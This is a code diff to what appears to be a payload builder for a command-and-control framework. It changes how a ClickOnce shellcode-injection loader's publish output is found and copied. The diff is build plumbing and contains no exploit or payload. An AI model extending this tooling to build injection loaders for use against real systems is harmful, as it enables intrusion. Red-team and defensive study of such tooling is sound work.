@@ -1085,7 +1085,6 @@ generated if none have been entered.""",
                     injection_config_destination = str(injection_config_destination)
 
                     try:
-                        # Extract encryption key from the key.hpp file
                         encryption_key_bytes = ""
                         if os.path.exists(encryption_key_path_cpp):
                             try:
@@ -1099,7 +1098,6 @@ generated if none have been entered.""",
                             except Exception as key_error:
                                 output += f"Warning: Could not extract encryption key: {str(key_error)}\n"
                         
-                        # Load and render the InjectionConfig.cs template
                         injection_config_template = environment.get_template("InjectionConfig.cs")
                         injection_config_data = {
                             "INJECTION_METHOD": self.get_parameter("0.6 ClickOnce - Injection Method"),
@@ -1108,7 +1106,6 @@ generated if none have been entered.""",
                         }
                         rendered_injection_config = injection_config_template.render(**injection_config_data)
                         
-                        # Write the rendered config to the destination
                         with open(injection_config_destination, "w") as config_file:
                             config_file.write(rendered_injection_config)
                         
@@ -1154,36 +1151,67 @@ generated if none have been entered.""",
                     if stderr:
                         output += f"[stderr]\n{stderr.decode(errors='replace')}"
 
-                    # ClickOnce publish outputs to bin/{Config}/net8.0-windows/win-x64/publish/
-                    clickonce_output_path = Path(clickonce_loader_path) / "bin" / f"{self.get_parameter('0.3 ClickOnce Build Configuration')}" / "net7.0-windows" / "win-x64" / "publish"
+                    # Locate publish output dynamically: bin/{config}/{tfm}/{rid}/publish
+                    config = self.get_parameter('0.3 ClickOnce Build Configuration')
+                    publish_root = Path(clickonce_loader_path) / "bin" / config
 
-                    # Find the main executable in the publish directory
-                    clickonce_exe = clickonce_output_path / "Erebus.ClickOnce.exe"
+                    tfm_dir = None
+                    if publish_root.exists():
+                        for child in publish_root.iterdir():
+                            if child.is_dir() and child.name.startswith("net") and "-windows" in child.name:
+                                tfm_dir = child
+                                break
 
-                    if clickonce_exe.exists():
-                        payload_dir = Path(agent_build_path) / "payload"
-                        for item in clickonce_output_path.iterdir():
-                            if item.is_file() and "Erebus.ClickOnce" in item.name:
-                                dest_path = payload_dir / item.name
-                                shutil.copy2(str(item), str(dest_path))
-                                if item.name == "Erebus.ClickOnce.exe":
-                                    if dest_path.exists():
-                                        shutil.move(str(dest_path), payload_path)
+                    publish_dir = None
+                    if tfm_dir:
+                        rid_dir = None
+                        for child in tfm_dir.iterdir():
+                            if child.is_dir():
+                                rid_dir = child
+                                break
+                        if rid_dir and (rid_dir / "publish").exists():
+                            publish_dir = rid_dir / "publish"
+                        elif (tfm_dir / "publish").exists():
+                            publish_dir = tfm_dir / "publish"
+                        else:
+                            publish_dir = tfm_dir
 
-                        response.status = BuildStatus.Success
-                        response.build_message = "ClickOnce Loader Compiled!"
-                        response.build_stdout = output + "\n" + payload_path
+                    if not publish_dir or not publish_dir.exists():
+                        response.status = BuildStatus.Error
+                        response.build_message = "Failed to locate ClickOnce publish output"
+                        response.build_stderr = output
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
                             StepName="Compiling ClickOnce Loader",
-                            StepStdout="ClickOnce Loader Compiled!",
-                            StepSuccess=True,
+                            StepStdout="Failed to locate ClickOnce publish output",
+                            StepSuccess=False,
                         ))
+                        return response
+
+                    # Prefer exe if present, else fall back to dll (non-Windows publish may omit host exe)
+                    clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
+                    clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"
+
+                    payload_dir = Path(agent_build_path) / "payload"
+                    payload_dir.mkdir(parents=True, exist_ok=True)
+
+                    # Copy all publish artifacts into payload directory
+                    for item in publish_dir.iterdir():
+                        if item.is_file():
+                            shutil.copy2(str(item), str(payload_dir / item.name))
+
+                    if clickonce_exe.exists():
+                        shutil.move(str(payload_dir / "Erebus.ClickOnce.exe"), payload_path)
+                        response.build_stdout = output + "\n" + payload_path
+                    elif clickonce_dll.exists():
+                        payload_path_dll = Path(payload_path).with_suffix(".dll")
+                        shutil.move(str(payload_dir / "Erebus.ClickOnce.dll"), payload_path_dll)
+                        response.build_stdout = output + "\n" + str(payload_path_dll)
                     else:
                         response.status = BuildStatus.Error
-                        response.build_message = f"Failed to compile ClickOnce loader - executable not found at {clickonce_exe}"
-                        response.build_stderr = output + "\n" + str(clickonce_exe)
+                        response.build_message = "Failed to compile ClickOnce loader - no exe or dll produced"
+                        response.build_stderr = output
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
@@ -1192,6 +1220,16 @@ generated if none have been entered.""",
                             StepSuccess=False,
                         ))
                         return response
+
+                    response.status = BuildStatus.Success
+                    response.build_message = "ClickOnce Loader Compiled!"
+                    await SendMythicRPCPayloadUpdatebuildStep(
+                        MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="Compiling ClickOnce Loader",
+                        StepStdout="ClickOnce Loader Compiled!",
+                        StepSuccess=True,
+                    ))
                     output = ""
 
             ######################### End Of Shellcode Loader Section #########################
